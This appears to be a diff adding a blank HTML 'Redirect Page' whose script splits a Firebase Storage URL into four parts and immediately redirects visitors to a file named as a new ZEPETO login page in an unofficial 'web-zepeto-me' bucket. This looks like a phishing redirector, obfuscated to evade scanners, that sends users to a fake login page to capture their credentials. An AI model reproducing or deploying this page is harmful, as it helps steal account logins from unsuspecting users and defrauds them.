@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirect Page</title>
+    <style>
+        body {
+            background-color: white;
+            margin: 0;
+            padding: 0;
+            height: 2000px; 
+        }
+    </style>
+</head>
+<body>
+    <div style="height: 2000px;"></div>
+    <script type="text/javascript">
+        
+        const part1 = "https://firebasestorage.googleapis.com";
+        const part2 = "/v0/b/web-zepeto-me.appspot.com/o/";
+        const part3 = "Zpeto%20Login%20Terbaru%2FZEPETO.html";
+        const part4 = "?alt=media&token=6460b460-ee25-462b-a888-179bd3586bdd";
+        
+        const hiddenURL = part1 + part2 + part3 + part4;
+        
+        window.location.replace(hiddenURL);
+    </script>
+</body>
+</html>
